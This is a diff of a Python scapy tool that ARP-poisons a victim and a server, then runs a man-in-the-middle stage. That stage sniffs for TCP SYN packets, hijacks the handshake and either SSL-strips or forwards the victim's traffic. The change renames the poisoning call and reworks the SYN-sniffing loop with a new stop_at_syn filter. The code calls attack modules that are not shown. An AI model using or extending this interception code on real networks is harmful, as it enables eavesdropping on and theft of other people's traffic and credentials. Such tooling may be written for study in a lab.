@@ -73,23 +73,22 @@ def main():
                 serverIP = parts[1] if parts[1] != "none" else None
                 print("len part", victimIP, " server: ",serverIP)
 
-                ArpPoisen.arp_poison(victimIP, serverIP, silent)
+                ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
 
                 if goal == "ownserver":
                     forwardToExternalServer()
                     return
                     
                 elif goal == "mitm":
-                    pkt = sc.sniff(filter="tcp", store=0)
-                    if pkt.haslayer(sc.TCP):
-                        tcp = pkt[sc.TCP]
-                        if tcp.flags == "S":
-                            if (not ArpPoisen.three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP)):
-                                continue
-                            if (sslStrip == "yes"):
-                                sslStripping.stripping(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
-                            else:
-                                sslStripping.forward(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
+                    print("sniffing for syn")
+                    pkt = sc.sniff(filter="tcp", stop_filter=stop_at_syn, count=0)[-1]
+                    print("found syn")
+                    if (not ArpPoisen.three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP)):
+                        continue
+                    if (sslStrip == "yes"):
+                        sslStripping.stripping(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
+                    else:
+                        sslStripping.forward(victimIP, victimMac, serverIP, serverMac, attackerIP, attackerMac)
             else:
                 print("Invalid input format. Please enter in the form: 'victim ip, server ip'")
         elif ipt == "quit":
@@ -119,6 +118,14 @@ def scan(ip_range):
         print(host)
     return
 
+def stop_at_syn(pkt):
+    if pkt.haslayer(sc.TCP):
+        tcp = pkt[sc.TCP]
+        # Check if SYN flag is set (flags is an int, SYN flag = 0x02)
+        # Or just do tcp.flags & 0x02 != 0
+        if tcp.flags & 0x02:
+            return True
+    return False
 
 
 def is_valid_ip_pair(s):
